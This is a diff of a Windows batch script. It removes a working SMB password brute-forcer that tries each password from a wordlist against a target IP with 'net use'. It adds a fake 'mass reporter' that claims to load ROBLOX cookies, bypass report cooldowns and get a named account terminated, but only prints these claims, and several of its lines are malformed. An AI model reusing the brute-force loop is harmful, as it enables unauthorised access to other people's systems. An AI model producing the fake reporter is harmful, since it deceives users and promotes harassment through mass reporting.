@@ -1,29 +1,17 @@
 @echo off
-title SMB Bruteforce - by Ebola Man
+title --------([NVJN Proprietary Mass Reporter]--------
 color A
 echo.
-set /p ip="Enter IP Address: "
-set /p user="Enter Username: "
-set /p wordlist="Enter Password List: "
-
-set /a count=1
-for /f %%a in (%wordlist%) do (
-  set pass=%%a
-  call :attempt
-)
-echo Password not Found :(
-pause
-exit
-
-:success
+set /p ip="Input Account Username.: "
+set /p user="Input Report Type. WARN/TERM/LOCK: "
 echo.
-echo Password Found! %pass%
-net use \\%ip% /d /y >nul 2>&1
-pause
-exit
+Moving Network Traffic to Mullvad Servers.
+echo.
+JS Requests Sent. Loading ROBLOX Cookies.
+echo.
+Executing XML to Bypass Report Cooldowns. Mass Report Hivenet Status: Online
 
-:attempt
-net use \\%ip% /user:%user% %pass% >nul 2>&1
-echo [ATTEMPT %count%] [%pass%]
-set /a count=%count%+1
-if %errorlevel% EQU 0 goto success
+echo.
+Account %user% Mass Reported.
+Chance Of Termination: 70%.
+Refresh Page Of %user% In 24 hours For Results.
